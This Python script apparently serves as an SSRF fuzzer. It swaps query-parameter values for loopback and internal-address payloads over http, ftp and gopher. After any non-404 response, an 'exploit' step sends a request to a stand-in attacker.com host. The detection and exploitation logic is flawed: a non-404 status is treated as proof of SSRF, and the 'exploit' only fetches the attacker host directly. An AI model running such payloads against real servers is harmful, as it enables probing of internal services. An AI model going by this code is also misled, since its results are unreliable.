import requests
from urllib.parse import urlparse, parse_qs

# list of test payloads to try
payloads = [
    'http://localhost',
    'ftp://localhost',
    'gopher://localhost',
    'http://127.0.0.1',
    'ftp://127.0.0.1',
    'gopher://127.0.0.1',
    'http://[::1]',
    'ftp://[::1]',
    'gopher://[::1]',
    'http://localhost:[port]',
    'ftp://localhost:[port]',
    'gopher://localhost:[port]',
    'http://127.0.0.1:[port]',
    'ftp://127.0.0.1:[port]',
    'gopher://127.0.0.1:[port]',
    'http://[::1]:[port]',
    'ftp://[::1]:[port]',
    'gopher://[::1]:[port]',
    'http://example.com?redirect=http://localhost',
    'http://example.com?file=http://localhost',
    'http://example.com?uri=http://localhost',
    'http://example.com?path=http://localhost',
    'http://example.com?download=http://localhost',
    'http://example.com?img=http://localhost',
    'http://example.com?pdf=http://localhost',
    'http://example.com?css=http://localhost',
    'http://example.com?js=http://localhost',
    'http://example.com?feed=http://localhost',
]

def send_request(url, auth=None):
    try:
        response = requests.get(url, auth=auth)
        if response.status_code != 404:
            print(f'Possible SSRF detected: {url}')
            # try to exploit the vulnerability
            # this example assumes the vulnerable endpoint is /api/get_data
            exploit_url = url.replace('http://localhost', 'http://attacker.com').replace('http://127.0.0.1', 'http://attacker.com').replace('http://[::1]', 'http://attacker.com')
            exploit_url = exploit_url.replace('[port]', '1337')
            exploit_url += '/api/get_data'
            response = requests.get(exploit_url)
            if response.status_code == 200:
                print('SSRF exploited! Response: ')
                print(response.text)
    except requests.exceptions.RequestException:
        pass

# function to fuzz a single parameter
def fuzz_parameter(url, param_name, payloads):
    for payload in payloads:
        fuzzed_url = url.replace(param_name, payload)
        send_request(fuzzed_url)

# function to fuzz all parameters of a URL
def fuzz_url(url, payloads):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    for param_name, param_values in query_params.items():
        for value in param_values:
            for payload in payloads:
                fuzzed_url = url.replace(f'{param_name}={value}', f'{param_name}={payload}')
                send_request(fuzzed_url)

# example usage
fuzz_url('http://example.com/?url=https://google.com', payloads)

print("Done!")
